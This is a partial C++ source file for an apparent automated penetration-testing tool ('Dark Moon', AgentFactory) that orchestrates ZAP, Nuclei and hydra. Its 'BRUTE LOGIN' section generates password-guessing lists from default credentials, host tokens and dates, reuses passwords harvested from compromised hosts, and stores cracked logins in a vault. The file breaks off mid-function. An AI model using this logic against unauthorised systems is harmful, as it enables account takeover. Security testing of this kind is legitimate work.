// main.cpp - AgentFactory (cross-platform: Windows + POSIX)
// Délégation vers ZAP-CLI, MCP, K8s — version portable.
//
// Remarques portage :
// - Console: ANSI partout; sous Windows, on tente d'activer VT (ENABLE_VIRTUAL_TERMINAL_PROCESSING).
// - run_command_capture: Windows -> CreateProcess + pipes ; POSIX -> fork/exec + pipes + select()
// - run_zapcli_ascan_progress: idem, 2 implémentations.
// - get_exe_parent_dir: Windows -> GetModuleFileNameA ; POSIX -> readlink(/proc/self/exe), fallback argv[0] (via _init_argv0)
// - KUBECONFIG: setenv() sous POSIX, _putenv_s sous Windows (conservé).
// - Résolution des binaires K8s: on accepte .exe (Windows) et sans extension (POSIX).

// ====== En-tête commun (à placer TOUT EN HAUT du fichier) ======
#if defined(_MSC_VER)
  #pragma warning(push, 0)
#endif

// C++ std
#include <cctype>
#include <cstdlib>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <algorithm>
#include <set>
#include <thread>
#include <chrono>
#include <ctime>
#include <regex>
#include <unordered_set>
#include <filesystem>   // C++17
#include <map>   // <-- ajoute ceci

// nlohmann::json (robuste aux deux chemins)
#if __has_include("json.hpp")
  #include "json.hpp"
#elif __has_include(<nlohmann/json.hpp>)
  #include <nlohmann/json.hpp>
#else
  #error "nlohmann json header not found. Place 'json.hpp' near main.cpp or install nlohmann/json."
#endif

// Plateforme
#ifdef _WIN32
  #ifndef NOMINMAX
  #define NOMINMAX 1
  #endif
  #include <windows.h>
  #include <io.h>
  #include <fcntl.h>
#else
  #include <unistd.h>
  #include <sys/types.h>
  #include <sys/wait.h>
  #include <sys/select.h>
  #include <sys/time.h>
  #include <sys/socket.h>   // <-- AJOUTER
  #include <netdb.h>        // <-- AJOUTER
  #include <signal.h>
  #include <errno.h>
  #include <fcntl.h>
  #include <limits.h>
#endif

#if defined(_MSC_VER)
  #pragma warning(pop)
#endif

// Aliases
using json = nlohmann::json;
namespace fs = std::filesystem;

// ---------- petites aides ----------
static void loginfo(const std::string &s){ std::cout << s << std::endl; }
static void logerr (const std::string &s){ std::cerr << "ERR: " << s << std::endl; }

// ---------- ANSI color helpers (Windows-safe) ----------
#ifdef _WIN32
static bool enable_ansi_colors() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return false;
    DWORD mode = 0;
    if (!GetConsoleMode(hOut, &mode)) return false;
    // ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
    if (mode & 0x0004) return true; // déjà activé
    return SetConsoleMode(hOut, mode | 0x0004);
}
#else
static bool enable_ansi_colors() { return true; }
#endif

namespace ansi {
    static constexpr const char* reset  = "\x1b[0m";
    static constexpr const char* white  = "\x1b[97m";
    static constexpr const char* green  = "\x1b[92m";
    static constexpr const char* blue   = "\x1b[94m";
    static constexpr const char* pink   = "\x1b[38;5;213m";
    static constexpr const char* sky    = "\x1b[96m";
    static constexpr const char* yellow = "\x1b[93m";
    static constexpr const char* orange = "\x1b[38;5;208m";
    static constexpr const char* red    = "\x1b[91m";
    static constexpr const char* bold   = "\x1b[1m"; 
}

// Ajoute ceci près du début du fichier (utilitaire pour répéter une chaîne UTF-8)
static std::string utf8_repeat(const std::string &s, int n) {
    if (n <= 0) return std::string();
    const int MAX_REPEAT = 200; // cap affichage
    if (n > MAX_REPEAT) n = MAX_REPEAT;
    std::string out;
    size_t reserveBytes = s.size() * (size_t)n;
    if (reserveBytes > 1000000) reserveBytes = 1000000;
    out.reserve(reserveBytes);
    for (int i = 0; i < n; ++i) out += s;
    return out;
}

// Count printable columns in a UTF-8 string (1 per code point; good enough for Latin/accents)
static size_t utf8_cols(const std::string& s){
    size_t cols = 0;
    for (unsigned char c : s){
        // count only leading bytes (not 10xxxxxx continuation bytes)
        if ((c & 0xC0) != 0x80) ++cols;
    }
    return cols;
}

// Pad with spaces to reach total columns (using utf8_cols)
static std::string pad_cols(size_t total_cols, const std::string& current){
    size_t used = utf8_cols(current);
    return std::string(total_cols > used ? (total_cols - used) : 0, ' ');
}

// ---------- Affichage Dark Moon (portable ANSI, pas d'API console Windows) ----------
static void print_dark_moon() {
    // On utilise exclusivement les séquences ANSI pour rester portable.
    enable_ansi_colors();

    auto SET = [](const char* fg){ std::cout << fg; };
    auto RST = [](){ std::cout << ansi::reset; };

    std::cout << "\n";
    SET(ansi::white);
    std::cout << " Version 1.0.4";
    SET(ansi::yellow);
    std::cout << "...............";
    SET(ansi::white);
    std::cout << "By Mehdi Boutayeb - ASC   ";
    RST();
    std::cout << " \n";
    std::cout << " \n";

    SET(ansi::blue);  std::cout << "  * ";
    SET(ansi::yellow);std::cout << "             __...__";
    SET(ansi::blue);  std::cout << "                           o  \n";

    SET(ansi::yellow);std::cout << "             .--'    __.=-.                            \n";

    SET(ansi::blue);  std::cout << "      |";
    SET(ansi::yellow);std::cout << "    ./     .-' ";
    SET(ansi::blue);  std::cout << "      *             o       \n";

    SET(ansi::blue);  std::cout << "     -O- ";
    SET(ansi::yellow);std::cout << "  /      /   ";
    SET(ansi::white); std::cout << "           _          _        \n";

    SET(ansi::blue);  std::cout << "      |";
    SET(ansi::yellow);std::cout << "   /   '''/ ";
    SET(ansi::blue);  std::cout << "  |";
    SET(ansi::white); std::cout << "        __| |__ _ _ _| |__     \n";

    SET(ansi::yellow);std::cout << "         |     (@)  ";
    SET(ansi::blue);  std::cout << "-O-";
    SET(ansi::white); std::cout << "      / _` / _` | '_| / /     \n";

    SET(ansi::yellow);std::cout << "        |        \\";
    SET(ansi::blue);  std::cout << "   |";
    SET(ansi::white); std::cout << "       \\__,_\\__,_|_| |_\\_\\    \n";

    SET(ansi::yellow);std::cout << "        |         \\";
    SET(ansi::white); std::cout << "           _ __  ___  ___ _ _     \n";

    SET(ansi::yellow);std::cout << "        |       ___\\";
    SET(ansi::white); std::cout << "         | '  \\/ _ \\/ _ \\ ' \\    \n";

    SET(ansi::blue);  std::cout << "  *";
    SET(ansi::yellow);std::cout << "     |  .   /  `";
    SET(ansi::white); std::cout << "          |_|_|_\\___/\\___/_||_|   \n";

    SET(ansi::yellow);std::cout << "         \\  `~~\\ ";
    std::cout << "*                                 \n";

    SET(ansi::yellow);std::cout << "          \\     \\";
    SET(ansi::white); std::cout << "                  Dark Moon    ";
    SET(ansi::blue);  std::cout << "  |   \n";

    SET(ansi::yellow);std::cout << "          `\\    `-.__ ";
    SET(ansi::white); std::cout << "           Cybersecurity ";
    SET(ansi::blue);  std::cout << "    -O-  \n";

    SET(ansi::blue);  std::cout << "     * ";
    SET(ansi::yellow);std::cout << "      `--._    `--=.";
    SET(ansi::blue);  std::cout << "                        |   \n";

    SET(ansi::yellow);std::cout << "                  `---~~`";
    SET(ansi::blue);  std::cout << "                *             \n";
    std::cout << "                          *                         *  \n";

    std::cout << ansi::reset << "\n";
}

// ---------- Pretty console helpers (flex, Unicode safe) ----------
static void print_header_box(const std::string& title){
    const int pad = 2;
    int w = (int)title.size() + pad*2;
    auto B = [](){ return ansi::blue; };
    auto S = [](){ return ansi::sky; };
    auto R = [](){ return ansi::reset; };

    std::cout << B() << u8"┌" << utf8_repeat(u8"─", w) << u8"┐" << R() << "\n";
    std::cout << B() << u8"│" << R() << std::string(pad, ' ')
              << S() << title << R() << std::string(pad, ' ')
              << B() << u8"│" << R() << "\n";
    std::cout << B() << u8"└" << utf8_repeat(u8"─", w) << u8"┘" << R() << "\n";
}

// key/value table with dynamic width
static std::string truncate_for_display(const std::string &s, size_t max_len) {
    if (s.size() <= max_len) return s;
    if (max_len <= 3) return s.substr(0, max_len);
    return s.substr(0, max_len - 3) + "...";
}

static void print_kv_table(const std::vector<std::pair<std::string,std::string>>& rows,
                           const std::unordered_set<std::string>& green_titles = {})
{
    const size_t MAX_COL = 200;
    size_t leftW = 0, rightW = 0;
    std::vector<std::pair<std::string,std::string>> tr;
    tr.reserve(rows.size());
    for (const auto &kv : rows) {
        std::string k = truncate_for_display(kv.first,  MAX_COL);
        std::string v = truncate_for_display(kv.second, MAX_COL);
        leftW  = std::max(leftW,  utf8_cols(k));
        rightW = std::max(rightW, utf8_cols(v));
        tr.emplace_back(std::move(k), std::move(v));
    }

    auto B = [](){ return ansi::blue;  };
    auto W = [](){ return ansi::white; };
    auto G = [](){ return ansi::green; };
    auto R = [](){ return ansi::reset; };

    // top border
    std::cout << B() << u8"┌" << utf8_repeat(u8"─", (int)leftW+2)
              << u8"┬" << utf8_repeat(u8"─", (int)rightW+2)
              << u8"┐" << R() << "\n";

    for (size_t i=0;i<tr.size();++i){
        const auto& k = tr[i].first;
        const auto& v = tr[i].second;
        bool leftIsGreen = (!k.empty() && green_titles.find(k) != green_titles.end());
        const char* leftColor = leftIsGreen ? G() : W();

        std::cout << B() << u8"│ " << leftColor << k << R() << pad_cols(leftW, k)
                  << B() << u8" │ " << W() << v << R() << pad_cols(rightW, v)
                  << B() << u8" │" << R() << "\n";

        if (i+1<tr.size()){
            std::cout << B() << u8"├" << utf8_repeat(u8"─", (int)leftW+2)
                      << u8"┼" << utf8_repeat(u8"─", (int)rightW+2)
                      << u8"┤" << R() << "\n";
        }
    }

    // bottom border
    std::cout << B() << u8"└" << utf8_repeat(u8"─", (int)leftW+2)
              << u8"┴" << utf8_repeat(u8"─", (int)rightW+2)
              << u8"┘" << R() << "\n";
}

static void print_target_box(const std::string& target_orig, const std::string& reason_orig){
    const size_t MAX_DISPLAY = 200;
    std::string target = truncate_for_display(target_orig, MAX_DISPLAY);
    std::string reason = truncate_for_display(reason_orig, MAX_DISPLAY);

    const std::string k1 = "Target";
    const std::string k2 = "Reason";

    const size_t leftW  = std::max(utf8_cols(k1), utf8_cols(k2));
    const size_t rightW = std::max(utf8_cols(target), utf8_cols(reason));

    auto B = [](){ return ansi::blue;  };
    auto S = [](){ return ansi::sky; };
    auto W = [](){ return ansi::white; };
    auto R = [](){ return ansi::reset; };

    std::cout << B() << u8"┌" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┬" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┐" << R() << "\n";

    std::cout << B() << u8"│ " << S() << k1 << R() << pad_cols(leftW, k1)
              << B() << u8" │ " << W() << target << R() << pad_cols(rightW, target)
              << B() << u8" │" << R() << "\n";

    std::cout << B() << u8"├" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┼" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┤" << R() << "\n";

    std::cout << B() << u8"│ " << S() << k2 << R() << pad_cols(leftW, k2)
              << B() << u8" │ " << W() << reason << R() << pad_cols(rightW, reason)
              << B() << u8" │" << R() << "\n";

    std::cout << B() << u8"└" << utf8_repeat(u8"─", static_cast<int>(leftW) + 2)
              << u8"┴" << utf8_repeat(u8"─", static_cast<int>(rightW) + 2)
              << u8"┘" << R() << "\n";
}

// Progress bar (10 blocs, UTF-8 safe)
static void render_progress_percent(int percent){
    if (percent < 0) { percent = 0; }
    if (percent > 100) { percent = 100; }
    int blocks = percent / 10; // 0..10
    const std::string filled = u8"■";
    const std::string empty  = u8"□";
    std::string bar = utf8_repeat(filled, blocks) + utf8_repeat(empty, 10 - blocks);
    std::ostringstream oss;
    oss << "\r" << ansi::yellow << "Progress: " << bar << " " << std::setw(3) << percent << "%" << ansi::reset;
    std::cout << oss.str();
    std::cout.flush();
}

// -----------------------------------------------------------------------------
// Helpers fichiers, etc.
// -----------------------------------------------------------------------------

static std::string readFile(const std::string &path) {
    std::ifstream ifs(path, std::ios::in | std::ios::binary);
    if (!ifs.is_open()) return std::string();
    std::ostringstream ss;
    ss << ifs.rdbuf();
    return ss.str();
}

static std::string extract_hostname(const std::string &url) {
    std::string s = url;
    size_t p = s.find("://");
    if (p != std::string::npos) s = s.substr(p + 3);
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    for (char &c : s) {
        if (c == ':' || c == '/' || c == '\\' || c == '?' || c == '&' || c == '=')
            c = '_';
    }
    if (s.empty()) {
        s = url;
        std::replace(s.begin(), s.end(), '/', '_');
        std::replace(s.begin(), s.end(), ':', '_');
    }
    return s;
}

static std::string extract_netloc(const std::string &url) {
    std::string s = url;
    size_t p = s.find("://");
    if (p != std::string::npos) s = s.substr(p + 3);
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    return s; // ex: "dvga:5013"
}

static std::string current_datetime_string() {
    std::time_t t = std::time(nullptr);
    std::tm tm{};
#ifdef _WIN32
    localtime_s(&tm, &t);
#else
    localtime_r(&t, &tm);
#endif
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y%m%d_%H%M%S");
    return oss.str();
}

// Helpers génériques pour l'IA symbolique post-exploit
// ------------------
// Helper : to_lower_copy
// ------------------
static std::string to_lower_copy(const std::string &s) {
    std::string out(s);
    std::transform(out.begin(), out.end(), out.begin(),
                   [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
    return out;
}


static bool icontains(const std::string &haystack, const std::string &needle) {
    if (needle.empty()) return true;
    std::string h = to_lower_copy(haystack);
    std::string n = to_lower_copy(needle);
    return h.find(n) != std::string::npos;
}

// Très simple échappement pour mettre une chaîne dans des guillemets doubles shell
static std::string shell_escape_double_quotes(const std::string &s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        if (c == '"') out += "\\\"";
        else out += c;
    }
    return out;
}

// ---------------- Severity helpers (Nuclei) ----------------

// ---------------- Nuclei severity policy (no ENV, internal policy) ----------------
// Ciblé (phase 2) : on reste raisonnable mais utile
static inline const std::string& nuclei_severity_targeted() {
    static const std::string sev = "critical,high,medium";
    return sev;
}

// Fallback (plan vide) : on élargit volontairement
static inline const std::string& nuclei_severity_fallback() {
    static const std::string sev = "critical,high,medium,low";
    return sev;
}

// ------------------
// Simple URL parser helper
// ------------------
struct UrlParts {
    std::string scheme;
    std::string host;
    std::string path;
    std::string query;
    int         port = 0;
};

static UrlParts parse_url(const std::string &url_in) {
    UrlParts p;
    std::string s = url_in;
    // trim left
    size_t first = s.find_first_not_of(" \t\r\n");
    if (first != std::string::npos) s = s.substr(first);
    // scheme
    size_t scheme_pos = s.find("://");
    if (scheme_pos != std::string::npos) {
        p.scheme = to_lower_copy(s.substr(0, scheme_pos));
        s = s.substr(scheme_pos + 3);
    } else {
        p.scheme = "http";
    }
    // host[:port]
    size_t path_start = s.find_first_of("/?#");
    std::string hostport = (path_start == std::string::npos) ? s : s.substr(0, path_start);
    if (path_start != std::string::npos) s = s.substr(path_start);
    else s.clear();

    // split host and port (simple; IPv6 literal `[::]` not fully supported)
    if (!hostport.empty()) {
        if (hostport.size() > 0 && hostport[0] == '[') {
            // possible IPv6 literal like [::1]:8080
            size_t closeb = hostport.find(']');
            if (closeb != std::string::npos) {
                p.host = hostport.substr(0, closeb + 1);
                if (closeb + 1 < hostport.size() && hostport[closeb + 1] == ':') {
                    std::string portstr = hostport.substr(closeb + 2);
                    try { p.port = std::stoi(portstr); } catch(...) { p.port = 0; }
                }
            } else {
                p.host = hostport;
            }
        } else {
            size_t col = hostport.rfind(':');
            if (col != std::string::npos) {
                std::string portstr = hostport.substr(col + 1);
                bool numeric = !portstr.empty();
                for (char ch : portstr) if (!std::isdigit((unsigned char)ch)) { numeric = false; break; }
                if (numeric) {
                    try { p.port = std::stoi(portstr); } catch(...) { p.port = 0; }
                    p.host = hostport.substr(0, col);
                } else {
                    p.host = hostport;
                }
            } else {
                p.host = hostport;
            }
        }
    }

    // path + query
    if (!s.empty()) {
        size_t qpos = s.find('?');
        size_t hpos = s.find('#');
        size_t end_path = std::min(qpos == std::string::npos ? s.size() : qpos,
                                   hpos == std::string::npos ? s.size() : hpos);
        p.path = s.substr(0, end_path);
        if (qpos != std::string::npos) {
            size_t qend = (hpos == std::string::npos) ? s.size() : hpos;
            if (qend > qpos + 1) p.query = s.substr(qpos + 1, qend - (qpos + 1));
        }
        if (p.path.empty()) p.path = "/";
    } else {
        p.path = "/";
    }

    // defaults for port if missing
    if (p.port == 0) {
        if (to_lower_copy(p.scheme) == "https") p.port = 443;
        else p.port = 80;
    }

    return p;
}



// ========================= IA symbolique - BRUTE LOGIN =========================

// Chargement/écriture du vault de credentials (workdir/creds_vault.json)
static nlohmann::json load_creds_vault(const fs::path &workdir) {
    using json = nlohmann::json;
    fs::path vault = workdir / "creds_vault.json";
    if (!fs::exists(vault)) {
        json j;
        j["version"] = 1;
        j["updated_at"] = current_datetime_string();
        j["creds"] = json::array();
        return j;
    }
    try {
        std::string s = readFile(vault.string());
        if (s.empty()) {
            json j;
            j["version"] = 1;
            j["updated_at"] = current_datetime_string();
            j["creds"] = json::array();
            return j;
        }
        json j = json::parse(s, nullptr, false);
        if (j.is_discarded()) {
            json k;
            k["version"] = 1;
            k["updated_at"] = current_datetime_string();
            k["creds"] = json::array();
            return k;
        }
        if (!j.contains("creds") || !j["creds"].is_array()) j["creds"] = json::array();
        return j;
    } catch (...) {
        json j;
        j["version"] = 1;
        j["updated_at"] = current_datetime_string();
        j["creds"] = json::array();
        return j;
    }
}

static void save_creds_vault(const fs::path &workdir, const nlohmann::json &vault) {
    fs::path vaultf = workdir / "creds_vault.json";
    try {
        nlohmann::json v = vault;
        v["updated_at"] = current_datetime_string();
        std::ofstream out(vaultf);
        out << v.dump(2);
        loginfo("[VAULT] creds_vault.json mis a jour.");
    } catch (...) {
        logerr("[VAULT] echec ecriture creds_vault.json");
    }
}

static void vault_add_credential(nlohmann::json &vault,
                                 const std::string &host,
                                 const std::string &service,
                                 const std::string &endpoint,
                                 const std::string &username,
                                 const std::string &password,
                                 const std::string &source) {
    using json = nlohmann::json;
    if (username.empty() || password.empty()) return;

    // de-dup basique
    if (vault.contains("creds") && vault["creds"].is_array()) {
        for (auto &c : vault["creds"]) {
            if (c.value("host","")==host &&
                c.value("service","")==service &&
                c.value("endpoint","")==endpoint &&
                c.value("username","")==username &&
                c.value("password","")==password) {
                return;
            }
        }
    }
    json e;
    e["ts"] = current_datetime_string();
    e["host"] = host;
    e["service"] = service;          // "web", "db", "smb", ...
    e["endpoint"] = endpoint;        // URL ou ressource
    e["username"] = username;
    e["password"] = password;
    e["source"]   = source;          // "hydra", "curl-brute", "sqlmap-dump", ...
    vault["creds"].push_back(e);
}

// split utilitaire (host -> tokens)
static std::vector<std::string> split_tokens(const std::string &s, const std::string &delims) {
    std::vector<std::string> out;
    std::string tok;
    for (char c : s) {
        if (delims.find(c) != std::string::npos) {
            if (!tok.empty()) { out.push_back(tok); tok.clear(); }
        } else tok.push_back(c);
    }
    if (!tok.empty()) out.push_back(tok);
    return out;
}

static void uniq_prune(std::vector<std::string> &v, size_t max_keep=0) {
    std::unordered_set<std::string> seen;
    std::vector<std::string> out;
    out.reserve(v.size());
    for (auto &s : v) {
        if (s.empty()) continue;
        if (seen.insert(s).second) out.push_back(s);
    }
    if (max_keep && out.size() > max_keep) out.resize(max_keep);
    v.swap(out);
}

static std::vector<std::string> month_words() {
    return {
        "jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec",
        "janvier","fevrier","février","mars","avril","mai","juin","juillet","aout","août","septembre","octobre","novembre","decembre","décembre"
    };
}

static std::vector<std::string> season_words() {
    return {"spring","summer","autumn","fall","winter","printemps","ete","été","automne","hiver"};
}

static std::vector<std::string> base_usernames() {
    return {"admin","administrator","root","user","test","guest","editor","manager","webmaster","operator",
            "wpadmin","git","gitlab","grafana","kibana","jenkins","dbadmin","support","dev","ops","monitoring"};
}

static std::vector<std::string> base_passwords() {
    return {
        "admin","administrator","root","password","pass","secret","toor","changeme","welcome",
        "123456","12345678","123456789","qwerty","azerty","admin123","admin1234","admin12345",
        "password1","password01","letmein","trustno1","iloveyou"
    };
}

// Génération de mots de passe contextuels très riches à partir du host/techs/annees/mois
static std::vector<std::string> build_contextual_passwords(const std::string &host,
                                                           const nlohmann::json &surfaces,
                                                           const fs::path &workdir) {
    std::vector<std::string> out = base_passwords();

    // Seeds issus du host (ex: "login.shop.example-corp.local" -> tokens)
    auto tokens = split_tokens(to_lower_copy(host), "._-");
    for (auto &t : tokens) {
        if (t.size() < 3 || t.size() > 20) continue;
        out.push_back(t);
        out.push_back(t + "123");
        out.push_back(t + "123!");
        out.push_back(t + "@123");
        out.push_back(t + "2024");
        out.push_back(t + "2025");
        out.push_back(t + "!2024");
        out.push_back(t + "!2025");
        out.push_back(t + "#2024");
        out.push_back(t + "#2025");
        out.push_back(t + "!");
        out.push_back(t + "@");
    }

    // Années récentes + saisons/mois
    std::vector<int> years = {2025, 2024, 2023, 2022, 2021};
    for (int y : years) {
        out.push_back(std::to_string(y));
        for (auto &m : month_words()) {
            out.push_back(m + std::to_string(y));
            out.push_back(m + "!" + std::to_string(y));
        }
        for (auto &s : season_words()) {
            out.push_back(s + std::to_string(y));
            out.push_back(s + "!" + std::to_string(y));
        }
    }

    // Tech stacks vues (whatweb/httpx/nuclei) -> ajouter comme seeds
    auto push_tech_seed = [&](const std::string &s) {
        std::string t = to_lower_copy(s);
        if (t.empty()) return;
        out.push_back(t + "123");
        out.push_back(t + "2024");
        out.push_back(t + "2025");
        out.push_back(t + "!2024");
        out.push_back(t + "!2025");
    };

    // Recon whatweb stdout/verbose
    auto ww1 = workdir / "recon_whatweb_stdout.txt";
    auto ww2 = workdir / "recon_whatweb_verbose.log";
    for (auto &f : {ww1, ww2}) {
        if (!fs::exists(f)) continue;
        try {
            std::string txt = readFile(f.string());
            if (icontains(txt, "WordPress")) push_tech_seed("wordpress");
            if (icontains(txt, "Drupal"))    push_tech_seed("drupal");
            if (icontains(txt, "Joomla"))    push_tech_seed("joomla");
            if (icontains(txt, "Prestashop"))push_tech_seed("prestashop");
            if (icontains(txt, "Magento"))   push_tech_seed("magento");
            if (icontains(txt, "Grafana"))   push_tech_seed("grafana");
            if (icontains(txt, "Kibana"))    push_tech_seed("kibana");
            if (icontains(txt, "Jenkins"))   push_tech_seed("jenkins");
            if (icontains(txt, "Keycloak"))  push_tech_seed("keycloak");
        } catch (...) {}
    }

    // Artefacts confirm_* (DB/infra déjà pwnd -> réutiliser pwd)
    for (auto const &entry : fs::directory_iterator(workdir)) {
        if (!entry.is_regular_file()) continue;
        std::string name = entry.path().filename().string();
        if (name.rfind("confirm_", 0) == 0) {
            try {
                std::string txt = readFile(entry.path().string());
                std::istringstream iss(txt);
                std::string line;
                while (std::getline(iss, line)) {
                    if (icontains(line, "password=") || icontains(line, "pwd=") || icontains(line, "pass=")) {
                        auto pos = line.find('=');
                        if (pos != std::string::npos) {
                            std::string pw = line.substr(pos+1);
                            if (!pw.empty()) out.push_back(pw);
                        }
                    }
                }
            } catch (...) {}
        }
    }

    uniq_prune(out, 400 /* cap raisonnable */);
    return out;
}

// Génération de usernames contextuels
static std::vector<std::string> build_contextual_usernames(const std::string &host,
                                                           const nlohmann::json &vault) {
    std::vector<std::string> out = base_usernames();

    // Usernames connus dans le vault pour ce host
    if (vault.contains("creds") && vault["creds"].is_array()) {
        for (auto &c : vault["creds"]) {
            if (c.value("host","") == host) {
                std::string u = c.value("username","");
                if (!u.empty()) out.push_back(u);
            }
        }
    }

    // Dérivés du host
    auto tokens = split_tokens(to_lower_copy(host), "._-");
    for (auto &t : tokens) {
        if (t.size() < 3 || t.size() > 20) continue;
        out.push_back(t);
        out.push_back(t.substr(0, std::min<size_t>(8, t.size())));
    }

    uniq_prune(out, 120);
    return out;
}

// Heuristique BASIC/DIGEST à partir des artefacts (headers WWW-Authenticate vus par httpx/zap)
static bool target_has_http_basic_or_digest(const fs::path &workdir, const std::string &host) {
    // On scanne httpx/whatweb/zap stdouts
    std::vector<fs::path> candidates = {
        workdir / "recon_httpx.txt",
        workdir / "recon_whatweb_stdout.txt",
        workdir / "recon_whatweb_verbose.log",
        workdir / "alerts_filtered.json"
    };
    for (auto &p : candidates) {
        if (!fs::exists(p)) continue;
        try {
            std::string txt = readFile(p.string());
            if (icontains(txt, "www-authenticate") && (icontains(txt, "basic") || icontains(txt,"digest"))) {
                if (host.empty() || icontains(txt, host)) return true;
            }
        } catch (...) {}
    }
    return false;
}

// Déterminer si l'URL ressemble à WordPress login
static bool is_wp_login(const std::string &url) {
    return icontains(url, "/wp-login.php") || icontains(url, "wp-admin");
}

// Génère un "failure" et "success" pattern génériques pour hydra (lang FR/EN)
static std::string hydra_failure_regex_generic() {
    // Hydra est case sensitive pour F=/S=; on prévoit plusieurs fragments
    return "F=invalid|incorrect|failed|unauthorized|forbidden|denied|echec|erreur|mot de passe|identifiant|captcha";
}
static std::string hydra_success_regex_generic() {
    return "S=logout|wp-admin|dashboard|admin|Set-Cookie";
}


// -----------------------------------------------------------------------------
// Trouver le dernier alerts_*.json (non-recursif)
// -----------------------------------------------------------------------------
static fs::path find_latest_alerts_json(const fs::path &workdir) {
    fs::path latest;
    fs::file_time_type latest_time;
    bool found = false;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind("alerts_", 0) == 0 && p.path().extension() == ".json") {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > latest_time) {
                    latest_time = t;
                    latest = p.path();
                    found = true;
                }
            }
        }
    } catch (const std::exception &ex) {
        logerr(std::string("find_latest_alerts_json: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return latest;
}

// -----------------------------------------------------------------------------
// Fichier récent contenant une sous-chaine (récursif)
// -----------------------------------------------------------------------------
static fs::path find_newest_file_containing(const fs::path &workdir, const std::string &contains) {
    fs::path best;
    fs::file_time_type best_t;
    bool found = false;
    try {
        for (auto &p : fs::recursive_directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.find(contains) != std::string::npos) {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > best_t) { best_t = t; best = p.path(); found = true; }
            }
        }
    } catch(...) {}
    return best;
}

// -----------------------------------------------------------------------------
// get_exe_parent_dir: Windows vs POSIX
// -----------------------------------------------------------------------------
static fs::path get_exe_parent_dir() {
#ifdef _WIN32
    char pathbuf[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, pathbuf, MAX_PATH);
    if (n == 0 || n == MAX_PATH) return fs::path(".");
    fs::path p(pathbuf);
    return p.parent_path();
#else
    // try /proc/self/exe
    char buf[PATH_MAX+1] = {0};
    ssize_t n = readlink("/proc/self/exe", buf, PATH_MAX);
    if (n > 0) {
        buf[n] = '\0';
        return fs::path(buf).parent_path();
    }
    // fallback to current path
    return fs::current_path();
#endif
}

// -----------------------------------------------------------------------------
// escape_for_cmdline: utilisé principalement côté Windows; POSIX on passe par /bin/sh -c
// -----------------------------------------------------------------------------
[[maybe_unused]] static std::string escape_for_cmdline(const std::string &s) {
    std::string out; out.reserve(s.size()*2);
    for (unsigned char c : s) {
        if (c == '\\') { out.push_back('\\'); out.push_back('\\'); }
        else if (c == '"') { out.push_back('\\'); out.push_back('"'); }
        else if (c == '\r') { /* ignore */ }
        else if (c == '\n') { out.push_back('\\'); out.push_back('n'); }
        else out.push_back((char)c);
    }
    return out;
}

// -----------------------------------------------------------------------------
// run_command_capture (xplat)
//   - timeout_ms: 0 => pas de timeout
//   - stream_to_console: si true, on réécrit les flux enfant vers stdout/stderr
// -----------------------------------------------------------------------------
static bool run_command_capture(const std::string &cmd,
                                std::string &out_stdout,
                                std::string &out_stderr,
                                unsigned long timeout_ms = 120000,
                                bool stream_to_console = true)
{
    out_stdout.clear();
    out_stderr.clear();

#ifdef _WIN32
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE outRd=NULL,outWr=NULL,errRd=NULL,errWr=NULL;
    if (!CreatePipe(&outRd, &outWr, &sa, 0)) return false;
    if (!SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0)) { CloseHandle(outRd); CloseHandle(outWr); return false; }
    if (!CreatePipe(&errRd, &errWr, &sa, 0)) { CloseHandle(outRd); CloseHandle(outWr); return false; }
    if (!SetHandleInformation(errRd, HANDLE_FLAG_INHERIT, 0)) { CloseHandle(outRd); CloseHandle(outWr); CloseHandle(errRd); CloseHandle(errWr); return false; }

    STARTUPINFOA si{}; PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.hStdOutput = outWr;
    si.hStdError  = errWr;
    si.dwFlags   |= STARTF_USESTDHANDLES;

    std::vector<char> cmdBuf(cmd.begin(), cmd.end());
    cmdBuf.push_back('\0');

    BOOL ok = CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) {
        DWORD err = GetLastError();
        LPVOID msgBuf = nullptr;
        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msgBuf, 0, NULL);
        std::ostringstream oss;
        oss << "CreateProcess failed (error " << err << "): " << (msgBuf ? (const char*)msgBuf : "unknown");
        logerr(oss.str());
        if (msgBuf) LocalFree(msgBuf);
        CloseHandle(outRd); CloseHandle(outWr); CloseHandle(errRd); CloseHandle(errWr);
        return false;
    }

    CloseHandle(outWr);
    CloseHandle(errWr);

    char tmp[4096];
    DWORD avail = 0;
    DWORD start = GetTickCount();

    for (;;) {
        // stdout
        while (PeekNamedPipe(outRd, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD r = 0;
